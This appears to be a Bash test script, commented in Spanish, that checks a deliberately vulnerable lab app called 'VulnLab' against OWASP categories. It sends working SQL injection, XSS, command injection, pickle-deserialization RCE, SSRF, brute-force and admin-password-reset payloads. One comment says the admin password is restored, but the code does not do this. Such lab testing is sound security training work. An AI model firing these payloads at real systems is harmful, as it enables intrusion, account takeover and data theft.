#!/usr/bin/env bash
# reporte_rapido.sh — Escaneo básico de vulnerabilidades con curl
set -euo pipefail

TARGET="${1:-http://localhost:8080}"

RED='\033[0;31m';  GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m';  BOLD='\033[1m'; NC='\033[0m'

pass=0; fail=0; warn=0

banner() {
  echo -e "\n${BOLD}${CYAN}══════════════════════════════════════════════════${NC}"
  echo -e "${BOLD}${CYAN}  VulnLab — Reporte Rápido de Vulnerabilidades${NC}"
  echo -e "${CYAN}  Target : ${TARGET}${NC}"
  echo -e "${CYAN}  Fecha  : $(date '+%Y-%m-%d %H:%M:%S')${NC}"
  echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════${NC}\n"
}

check() {
  local id="$1" desc="$2" result="$3" expected="$4" severity="$5"
  if echo "$result" | grep -qi "$expected"; then
    echo -e "  ${RED}[VULNERABLE]${NC} ${BOLD}${id}${NC} — ${desc}"
    echo -e "             Severidad: ${RED}${severity}${NC}"
    ((fail++)) || true
  else
    echo -e "  ${GREEN}[OK]${NC}         ${id} — ${desc}"
    ((pass++)) || true
  fi
}

warn_check() {
  local id="$1" desc="$2" result="$3" not_expected="$4"
  if ! echo "$result" | grep -qi "$not_expected"; then
    echo -e "  ${YELLOW}[ADVERTENCIA]${NC} ${BOLD}${id}${NC} — ${desc}"
    ((warn++)) || true
  else
    echo -e "  ${GREEN}[OK]${NC}          ${id} — ${desc}"
    ((pass++)) || true
  fi
}

banner

# ── Conectividad ──────────────────────────────────────────────
echo -e "${BOLD}[ Conectividad ]${NC}"
if curl -sf "${TARGET}/api/health" > /dev/null 2>&1; then
  echo -e "  ${GREEN}[OK]${NC} Servidor disponible en ${TARGET}"
else
  echo -e "  ${RED}[ERROR]${NC} No se puede conectar a ${TARGET}"
  exit 1
fi
echo ""

# ── A03: SQL Injection — Login ────────────────────────────────
echo -e "${BOLD}[ A03 — SQL Injection ]${NC}"
r=$(curl -sf -X POST "${TARGET}/login" -d "username=' OR '1'='1&password=x" 2>/dev/null || true)
check "SQLi-01" "Login bypass con ' OR '1'='1" "$r" "Bienvenido" "CRÍTICO"

r=$(curl -sf -G "${TARGET}/search" --data-urlencode "q=' UNION SELECT 1,username,password,role,email FROM users--" 2>/dev/null || true)
check "SQLi-02" "UNION extraction de contraseñas en /search" "$r" "admin" "CRÍTICO"
echo ""

# ── A03: XSS ─────────────────────────────────────────────────
echo -e "${BOLD}[ A03 — XSS Reflejado ]${NC}"
PAYLOAD='<script>alert(1)</script>'
r=$(curl -sf -G "${TARGET}/search" --data-urlencode "q=${PAYLOAD}" 2>/dev/null || true)
check "XSS-01" "Script reflejado sin encodear en /search" "$r" "<script>" "ALTO"
echo ""

# ── A03: Command Injection ────────────────────────────────────
echo -e "${BOLD}[ A03 — Command Injection ]${NC}"
r=$(curl -sf -X POST "${TARGET}/ping" -d "host=127.0.0.1; id" 2>/dev/null || true)
check "CMDi-01" "RCE con ; id en /ping" "$r" "uid=" "CRÍTICO"

r=$(curl -sf -X POST "${TARGET}/ping" -d "host=127.0.0.1 && whoami" 2>/dev/null || true)
check "CMDi-02" "RCE con && whoami en /ping" "$r" "root\|www-data\|nobody" "CRÍTICO"
echo ""

# ── A01: IDOR ─────────────────────────────────────────────────
echo -e "${BOLD}[ A01 — IDOR ]${NC}"
r=$(curl -sf "${TARGET}/notes?id=1" 2>/dev/null || true)
check "IDOR-01" "Acceso a nota del admin sin autenticación" "$r" "FLAG\|secreta" "ALTO"
echo ""

# ── A02: Cryptographic Failures ──────────────────────────────
echo -e "${BOLD}[ A02 — Cryptographic Failures ]${NC}"
r=$(curl -sf "${TARGET}/crypto" 2>/dev/null || true)
check "CRYPTO-01" "Contraseñas en texto plano expuestas en /crypto" "$r" "admin123\|password\|bob123" "CRÍTICO"
echo ""

# ── A04: Insecure Design ─────────────────────────────────────
echo -e "${BOLD}[ A04 — Insecure Design ]${NC}"
r=$(curl -sf -X POST "${TARGET}/reset" -d "action=request&username=alice" 2>/dev/null || true)
check "DESIGN-01" "Token de reset = ID de usuario (predecible) en /reset" "$r" "Token\|token" "ALTO"
# Usar el token predecible para cambiar contraseña del admin
r2=$(curl -sf -X POST "${TARGET}/reset" -d "action=use&token=1&new_password=hacked" 2>/dev/null || true)
check "DESIGN-02" "Reset de admin con token=1 (su ID) en /reset" "$r2" "actualizada\|Contraseña" "CRÍTICO"
# Restaurar contraseña del admin tras el test
curl -sf -X POST "${TARGET}/reset" -d "action=request&username=admin" > /dev/null 2>&1 || true
echo ""

# ── A05: Info Disclosure ──────────────────────────────────────
echo -e "${BOLD}[ A05 — Information Disclosure ]${NC}"
r=$(curl -sf "${TARGET}/info" 2>/dev/null || true)
check "INFO-01" "Secret key expuesta en /info" "$r" "secret_key" "CRÍTICO"
check "INFO-02" "Variables de entorno expuestas en /info" "$r" "HOME\|PATH\|DB_PATH" "ALTO"
echo ""

# ── A06: Vulnerable Components ────────────────────────────────
echo -e "${BOLD}[ A06 — Vulnerable and Outdated Components ]${NC}"
r=$(curl -sf "${TARGET}/components" 2>/dev/null || true)
check "COMP-01" "Versiones de paquetes expuestas en /components" "$r" "Flask\|Werkzeug\|pip\|Package" "MEDIO"
echo ""

# ── A07: Auth Failures ────────────────────────────────────────
echo -e "${BOLD}[ A07 — Identification and Authentication Failures ]${NC}"
r=$(curl -sf "${TARGET}/api/users" -H "X-Token: token123" 2>/dev/null || true)
check "AUTH-01" "Token débil hardcodeado en /api/users" "$r" "admin\|alice" "ALTO"
for i in $(seq 1 6); do
  curl -sf -X POST "${TARGET}/auth" -d "username=admin&password=wrong${i}" > /dev/null 2>&1 || true
done
r=$(curl -sf -X POST "${TARGET}/auth" -d "username=admin&password=still_wrong" 2>/dev/null || true)
check "AUTH-02" "Sin bloqueo tras múltiples intentos fallidos en /auth" "$r" "intento\|incorrecto\|sin bloqueo" "ALTO"
echo ""

# ── A08: Deserialización ─────────────────────────────────────
echo -e "${BOLD}[ A08 — Insecure Deserialization ]${NC}"
PICKLE_B64=$(python3 -c "import pickle,os,base64;
class P:
    def __reduce__(self): return (os.system,('echo VULN_DESER_OK',))
print(base64.b64encode(pickle.dumps(P())).decode())" 2>/dev/null)
r=$(curl -sf -X POST "${TARGET}/deserialize" -d "data=${PICKLE_B64}" 2>/dev/null || true)
check "DESER-01" "pickle.loads() ejecuta código arbitrario en /deserialize" "$r" "VULN_DESER_OK\|Objeto deserializado" "CRÍTICO"
echo ""

# ── A10: SSRF ────────────────────────────────────────────────
echo -e "${BOLD}[ A10 — SSRF ]${NC}"
r=$(curl -sf -G "${TARGET}/fetch" --data-urlencode "url=http://127.0.0.1:8080/info" 2>/dev/null || true)
# El server hace petición interna — si devuelve secret_key hay SSRF
r2=$(curl -sf -G "${TARGET}/fetch" --data-urlencode "url=http://127.0.0.1:5000/info" 2>/dev/null || true)
check "SSRF-01" "Fetch de URL interna /info via /fetch" "${r}${r2}" "secret_key\|Respuesta de" "ALTO"
echo ""

# ── A05: Cabeceras de seguridad ───────────────────────────────
echo -e "${BOLD}[ A05 — Cabeceras de seguridad HTTP ]${NC}"
headers=$(curl -sI "${TARGET}/" 2>/dev/null || true)
warn_check "HDR-01" "Content-Security-Policy presente" "$headers" "Content-Security-Policy"
warn_check "HDR-02" "X-Frame-Options presente"          "$headers" "X-Frame-Options"
warn_check "HDR-03" "X-Content-Type-Options presente"   "$headers" "X-Content-Type-Options"
echo ""

# ── Resumen ───────────────────────────────────────────────────
total=$((pass + fail + warn))
echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════${NC}"
echo -e "${BOLD}  RESUMEN${NC}"
echo -e "  Total checks : ${total}"
echo -e "  ${RED}Vulnerables  : ${fail}${NC}"
echo -e "  ${YELLOW}Advertencias : ${warn}${NC}"
echo -e "  ${GREEN}OK           : ${pass}${NC}"
echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════${NC}\n"

[[ $fail -gt 0 ]] && exit 1 || exit 0
